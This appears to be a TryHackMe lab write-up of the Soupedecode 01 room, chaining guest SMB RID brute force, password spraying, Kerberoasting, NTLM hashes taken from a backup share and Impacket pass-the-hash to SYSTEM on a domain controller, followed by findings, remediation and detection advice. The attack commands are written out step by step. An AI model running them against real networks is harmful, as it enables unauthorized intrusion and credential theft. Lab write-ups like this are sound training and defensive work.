---
title: "TryHackMe: Soupedecode 01"
date: 2025-12-28 21:46:54 +0100
categories: [TryHackMe]
tags:
  - windows
  - active-directory
  - smb
  - kerberos
  - rid-bruteforce
  - password-spraying
  - kerberoasting
  - ntlm
  - pass-the-hash
  - impacket
  - privilege-escalation
description: >-
  Soupedecode 01 chains SMB guest access, RID-based account discovery,
  password spraying, Kerberoasting, exposed backup credential material, and
  pass-the-hash into SYSTEM-level compromise of a Windows domain controller.
author: lenovolegion7
media_subpath: /images/tryhackme_soupedecode_01
image:
  path: room_image.webp
  alt: "Original TryHackMe Soupedecode 01 room artwork"
toc: true
comments: false
---

Soupedecode 01 is a Windows Active Directory challenge centered on SMB and Kerberos enumeration. The validated path used guest SMB access to enumerate domain users, obtained a low-privilege domain login through password spraying, Kerberoasted a service account, recovered credential material from a backup share, and finally used pass-the-hash to reach a privileged machine account and execute commands as `NT AUTHORITY\SYSTEM` on the domain controller.

> Passwords, hashes, target addresses, and TryHackMe flags are redacted.
{: .prompt-warning }

[![TryHackMe Soupedecode 01 room card](room_card.webp){: w="296" h="271" .shadow }](https://tryhackme.com/room/soupedecode01){: .center }

## Executive Summary

The target exposed the service profile expected from a Windows Active Directory domain controller:

```text
53/tcp    DNS
88/tcp    Kerberos
135/tcp   MSRPC
139/tcp   NetBIOS
389/tcp   LDAP
445/tcp   SMB
464/tcp   Kerberos password change
593/tcp   RPC over HTTP
636/tcp   LDAPS / wrapped
3268/tcp  LDAP Global Catalog
3269/tcp  Global Catalog TLS / wrapped
3389/tcp  RDP
```

The host identified itself as:

```text
Hostname: DC01
Domain:   SOUPEDECODE.LOCAL
OS:       Windows Server 2022 Build 20348 x64
```

The validated compromise path was:

1. enumerate all TCP services and identify `DC01.SOUPEDECODE.LOCAL` as a domain controller;
2. test SMB with the `guest` account and obtain read access to `IPC$`;
3. use RID bruteforce through SMB to enumerate domain users;
4. build a clean username list from the RID results;
5. test authentication patterns and obtain valid domain credentials for `ybob317` through password spraying;
6. enumerate SMB again as `ybob317` and obtain read access to the `Users` share;
7. retrieve the user objective from `\\DC01\Users\ybob317\Desktop\user.txt`;
8. request Kerberos service tickets for accounts with SPNs;
9. crack a Kerberoast ticket and recover the credential for `file_svc`;
10. authenticate as `file_svc` and gain read access to the `backup` share;
11. retrieve `backup_extract.txt`, which contained account names and NTLM credential material;
12. split the backup data into aligned username and hash lists;
13. spray the corresponding NTLM hashes over SMB;
14. identify the `FileServer$` machine account as administratively privileged on the target;
15. authenticate with the recovered machine-account hash and execute commands remotely with Impacket;
16. obtain a shell as `NT AUTHORITY\SYSTEM` on the domain controller;
17. retrieve the final objective from `C:\Users\Administrator\Desktop\root.txt`.

> **Result:** Low-privilege SMB exposure, weak credential practices, Kerberoastable service authentication, sensitive backup data, and excessive machine-account privilege combined into complete domain-controller compromise.
{: .prompt-danger }

## Scope and Safety Context

This assessment was performed only against the authorized TryHackMe Soupedecode 01 laboratory target.

Testing was limited to the assigned host and challenge objectives. Target addressing, passwords, Kerberos tickets, NTLM hashes, and challenge proof values are redacted from the public version.

## Initial Enumeration

Representative full TCP enumeration:

```console
$ nmap -T4 -n -sC -sV -Pn -p- TARGET_IP
```

Relevant results showed DNS, Kerberos, LDAP, SMB, RPC, Global Catalog, and RDP services. The TLS certificate and service metadata identified the domain controller as:

```text
DC01.SOUPEDECODE.LOCAL
```

A matching local resolver entry can be represented safely as:

```text
TARGET_IP DC01.SOUPEDECODE.LOCAL SOUPEDECODE.LOCAL
```

## SMB Guest Access

SMB enumeration showed that the `guest` account could authenticate without a published password and read the `IPC$` share:

```console
$ nxc smb dc01.soupedecode.local \
  -u 'guest' -p '' --shares
```

Relevant access:

```text
IPC$    READ
```

This did not directly expose the challenge files, but it provided enough authenticated SMB context to continue domain enumeration.

## RID Bruteforce User Discovery

Using the guest SMB context, RID bruteforce returned domain users and groups:

```console
$ nxc smb dc01.soupedecode.local \
  -u 'guest' -p '' --rid-brute 3000
```

The output included built-in principals, the domain-controller machine account, and user accounts such as:

```text
Administrator
Guest
krbtgt
DC01$
bmark0
...
```

A clean user list was generated from entries marked as `SidTypeUser`:

```console
$ nxc smb dc01.soupedecode.local \
  -u 'guest' -p '' --rid-brute 3000 \
  | grep SidTypeUser \
  | cut -d '\' -f 2 \
  | cut -d ' ' -f 1 \
  > valid_usernames.txt
```

## Password Spraying and User Objective

AS-REP Roasting did not produce a vulnerable account in the validated path. Initial common-password spray attempts were also unsuccessful.

A subsequent weak-password spray produced valid domain credentials for:

```text
ybob317
```

The literal password is not published.

Representative authentication validation:

```console
$ nxc smb dc01.soupedecode.local \
  -u 'ybob317' -p '[REDACTED]' --shares
```

The authenticated account had read access to:

```text
IPC$      READ
NETLOGON  READ
SYSVOL    READ
Users     READ
```

The user objective was available through the `Users` share:

```text
\\DC01\Users\ybob317\Desktop\user.txt
```

and is published only as:

```text
THM{[REDACTED]}
```

## Kerberoasting

With valid domain credentials, SPN enumeration identified several Kerberoastable service accounts:

```console
$ GetUserSPNs.py \
  -request \
  -outputfile kerberoastables.txt \
  'SOUPEDECODE.LOCAL/ybob317:[REDACTED]'
```

Observed service accounts included:

```text
FTP/FileServer          file_svc
FW/ProxyServer          firewall_svc
HTTP/BackupServer       backup_svc
HTTP/WebServer          web_svc
HTTPS/MonitoringServer  monitoring_svc
```

The requested Kerberos material was tested offline with `hashcat`:

```console
$ hashcat kerberoastables.txt \
  /usr/share/wordlists/rockyou.txt

$ hashcat kerberoastables.txt --show
```

The validated result recovered the password for `file_svc`; both the ticket and password are redacted in the public report.

## Backup Share and Credential Exposure

Authenticating as `file_svc` exposed read access to the `backup` share:

```console
$ nxc smb dc01.soupedecode.local \
  -u 'file_svc' -p '[REDACTED]' --shares
```

Relevant permission:

```text
backup  READ
```

The share contained:

```text
backup_extract.txt
```

The file held machine-account names paired with NTLM credential material. The public representation preserves the structure while redacting all hashes:

```text
WebServer$:[REDACTED]
DatabaseServer$:[REDACTED]
CitrixServer$:[REDACTED]
FileServer$:[REDACTED]
MailServer$:[REDACTED]
BackupServer$:[REDACTED]
ApplicationServer$:[REDACTED]
PrintServer$:[REDACTED]
ProxyServer$:[REDACTED]
MonitoringServer$:[REDACTED]
```

The data was split into aligned account and hash lists:

```console
$ cat backup_extract.txt \
  | cut -d ':' -f 1 \
  > backup_extract_users.txt

$ cat backup_extract.txt \
  | cut -d ':' -f 4 \
  > backup_extract_hashes.txt
```

## Hash Spraying and Administrative Access

The username/hash pairs were tested over SMB:

```console
$ nxc smb dc01.soupedecode.local \
  -u backup_extract_users.txt \
  -H backup_extract_hashes.txt \
  --no-bruteforce \
  --continue-on-success
```

The `FileServer$` machine account produced an administrative success indication.

Its NTLM hash is redacted:

```text
SOUPEDECODE.LOCAL\FileServer$:[REDACTED] (Pwn3d!)
```

Impacket remote execution then provided command execution on the domain controller:

```console
$ smbexec.py \
  -hashes :[REDACTED] \
  'SOUPEDECODE.LOCAL/FileServer$@dc01.soupedecode.local'
```

Validated identity:

```text
nt authority\system
```

The final objective was located at:

```text
C:\Users\Administrator\Desktop\root.txt
```

and is redacted:

```text
THM{[REDACTED]}
```

## Excessive Machine-Account Privilege

A group-membership check showed that the `FileServer$` computer account belonged to:

```text
CN=Enterprise Admins,CN=Users,DC=SOUPEDECODE,DC=LOCAL
```

Representative validation:

```powershell
(Get-ADComputer "FileServer$" -Properties MemberOf).MemberOf
```

This explains why possession of the machine-account hash translated directly into highly privileged access on the domain controller.

## Findings

### F-01 - Guest SMB Access Enables Domain User Enumeration

- **Severity:** Medium
- **Affected service:** SMB on TCP/445
- **Affected context:** `guest` / `IPC$`
- **Impact:** unauthenticated or effectively anonymous account discovery

Guest SMB access provided enough domain context for RID bruteforce to enumerate valid domain principals. That user list materially improved the effectiveness of later authentication attacks.

**Remediation:**

- disable unnecessary guest SMB access;
- restrict anonymous and guest SID/RID enumeration;
- limit `IPC$` access to authenticated administrative or operational use cases;
- monitor large RID-enumeration sequences and repeated SAMR/LSA queries.

### F-02 - Weak Domain Password Permits Password-Spray Authentication

- **Severity:** High
- **Affected account:** `ybob317`
- **Impact:** initial authenticated domain access

Password spraying against enumerated accounts produced a valid low-privilege domain login.

**Remediation:**

- enforce strong, non-user-derived passwords;
- deploy banned-password and password-quality controls;
- use smart lockout and spray-resistant authentication policy;
- monitor distributed authentication failures followed by a success.

### F-03 - Kerberoastable Service Credential Is Recoverable Offline

- **Severity:** High
- **Affected account:** `file_svc`
- **Impact:** access to a more privileged SMB data path

A service account with an SPN exposed Kerberos service-ticket material that could be cracked offline, yielding the `file_svc` credential.

**Remediation:**

- use long random passwords or group Managed Service Accounts for SPN-bearing services;
- rotate legacy service-account credentials;
- prefer AES Kerberos encryption where operationally possible;
- monitor anomalous TGS requests across many SPNs.

### F-04 - Backup Share Exposes Reusable NTLM Credential Material

- **Severity:** Critical
- **Affected share:** `backup`
- **Affected file:** `backup_extract.txt`
- **Impact:** reusable machine-account credentials available to a compromised service account

The backup share exposed account names and NTLM hashes. These values were directly usable for pass-the-hash authentication without recovering plaintext passwords.

**Remediation:**

- never store reusable NTLM credential material in general-purpose SMB shares;
- encrypt sensitive backup exports with access controls separate from service accounts;
- remove stale credential extracts immediately after their operational use;
- rotate all exposed account secrets and machine-account credentials;
- audit backup shares for password, hash, ticket, and key material.

### F-05 - FileServer$ Has Excessive Enterprise Admin Privilege

- **Severity:** Critical
- **Affected principal:** `FileServer$`
- **Affected group:** `Enterprise Admins`
- **Impact:** compromise of one machine-account hash results in domain-wide administrative capability

The `FileServer$` computer account was a member of `Enterprise Admins`. Once its NTLM hash was exposed, remote execution on the domain controller succeeded with SYSTEM-level access.

**Remediation:**

- remove machine accounts from `Enterprise Admins` unless an exceptional and documented requirement exists;
- apply least privilege to computer accounts and service identities;
- regularly review membership of `Domain Admins`, `Enterprise Admins`, and equivalent privileged groups;
- alert on privileged-group membership changes involving computer accounts.

## Security Impact

The validated chain resulted in complete domain-controller compromise from an initial guest-access position.

An attacker with equivalent access could:

- enumerate domain users;
- obtain a valid domain session through password spraying;
- request and crack service tickets offline;
- access sensitive backup data;
- reuse NTLM hashes without recovering plaintext passwords;
- execute commands as SYSTEM on the domain controller;
- access domain-wide administrative capabilities inherited through `Enterprise Admins`.

## Detection Opportunities

Useful monitoring controls include:

- alert on guest SMB logons followed by RID/SAMR enumeration;
- detect password-spray patterns across many accounts;
- monitor abnormal volumes of Kerberos TGS requests;
- alert on access to files containing credential-like backup material;
- detect SMB authentication using privileged machine accounts from unusual hosts;
- monitor pass-the-hash indicators and remote service execution;
- alert on computer accounts added to highly privileged domain groups.

## Remediation Priorities

1. Remove `FileServer$` from `Enterprise Admins` and review all privileged group memberships.
2. Remove NTLM credential exports from the `backup` share and rotate every exposed credential.
3. Reset and harden the `file_svc` service account, preferably migrating it to a managed service account.
4. Enforce stronger password policy and banned-password controls for domain users.
5. Disable unnecessary guest SMB access and restrict RID enumeration.
6. Add detection for password spraying, Kerberoasting, pass-the-hash, and remote service execution.
7. Review other SMB shares for stored hashes, tickets, keys, or password material.

## Retest Plan

1. Confirm guest SMB access no longer exposes a useful RID-enumeration path.
2. Verify the previous spray pattern no longer authenticates to `ybob317` or any other user.
3. Confirm service-account Kerberos tickets cannot be feasibly cracked with the prior wordlist-based approach.
4. Verify `file_svc` no longer has access to credential-bearing backup material.
5. Confirm `backup_extract.txt` and equivalent NTLM exports are absent from accessible shares.
6. Verify the previous `FileServer$` hash no longer authenticates after credential rotation.
7. Confirm `FileServer$` is no longer a member of `Enterprise Admins` or other excessive privileged groups.
8. Verify the previous attack chain can no longer produce SYSTEM-level command execution on the domain controller.

## Lessons Learned

Soupedecode 01 demonstrates how individually familiar Active Directory weaknesses become critical when they form a credential-escalation chain.

Guest SMB access enabled account discovery, weak passwords converted discovery into authenticated access, Kerberoasting exposed a service credential, the service account exposed reusable NTLM material, and excessive machine-account privilege turned that material into complete domain-controller compromise.

The strongest defensive response is to protect identity data and privilege boundaries as one connected system: reduce anonymous enumeration, harden passwords and service identities, keep credential material out of shares, and continuously review privileged group membership.
